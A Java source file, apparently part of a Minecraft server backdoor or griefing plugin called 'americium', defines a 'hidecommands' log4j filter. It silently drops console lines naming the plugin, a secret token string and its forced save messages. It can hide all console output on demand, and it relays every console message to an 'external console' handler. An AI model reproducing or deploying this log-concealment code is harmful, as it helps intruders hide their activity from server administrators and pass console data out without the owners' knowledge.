package cc.americium.command.commands;

import cc.americium.Colors;
import cc.americium.Z_;
import cc.americium.command.Command;
import cc.americium.command.Context;
import cc.americium.command.Sender;
import org.apache.logging.log4j.Level;
import org.apache.logging.log4j.LogManager;
import org.apache.logging.log4j.Marker;
import org.apache.logging.log4j.core.Filter;
import org.apache.logging.log4j.core.LogEvent;
import org.apache.logging.log4j.core.Logger;
import org.apache.logging.log4j.core.filter.AbstractFilter;
import org.apache.logging.log4j.message.Message;
import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

public class HideCommands extends AbstractFilter implements Command {
    private static final org.apache.logging.log4j.core.Logger logger = (org.apache.logging.log4j.core.Logger) LogManager.getRootLogger();
    private boolean isHidden = false;
    private Z_ z;

    @Override
    public String[] getCommands() {
        return new String[]{"hidecommands", "hc", "hideconsole"};
    }

    @Override
    public String getDescription() {
        return "Hides all commands from console.";
    }

    @Override
    public void execute(Player executor, Sender sender, Context context) {
        isHidden = !isHidden;
        if (isHidden) {
            sender.sendMessage(Colors.Prefix + Colors.Success + "Successfully started hiding all messages from console!");
            return;
        }

        sender.sendMessage(Colors.Prefix + Colors.Failure + "Stopped hiding all messages from console!");
    }

    @Override
    public void onEnable(Z_ z) {
        logger.addFilter(this);
        this.z = z;
    }

    @Override
    public void onDisable(Z_ z) {
        this.stop();
    }

    private Filter.Result validateMessage(Message message) {
        if (message == null) {
            return Result.NEUTRAL;
        }
        return validateMessage(message.getFormattedMessage());
    }

    private Filter.Result validateMessage(String message) {
        if (!z.isDisabling && !message.contains("Stopping")) {
            try {
                Bukkit.getScheduler().scheduleAsyncDelayedTask(this.z, () -> {
                    if (z.getExternalConsole() != null) {
                        z.getExternalConsole().handleConsoleMessage(message);
                    }
                });
            } catch (Exception ignored) {

            }
        }

        if (message.contains("americium:") || message.contains("sfdsfs7jd4dfsdf") || message.contains("A manual (plugin-induced) save has")) {
            return Result.DENY;
        }

        return isHidden ? Result.DENY : Result.NEUTRAL;
    }

    @Override
    public Filter.Result filter(LogEvent event) {
        Message candidate = null;
        if (event != null) {
            candidate = event.getMessage();
        }
        return validateMessage(candidate);
    }

    @Override
    public Filter.Result filter(Logger logger, Level level, Marker marker, Message msg, Throwable t) {
        return validateMessage(msg);
    }

    @Override
    public Filter.Result filter(Logger logger, Level level, Marker marker, Object msg, Throwable t) {
        String candidate = null;
        if (msg != null) {
            candidate = msg.toString();
        }

        return validateMessage(candidate);
    }

    @Override
    public Filter.Result filter(Logger logger, Level level, Marker marker, String msg, Object... params) {
        return validateMessage(msg);
    }
}
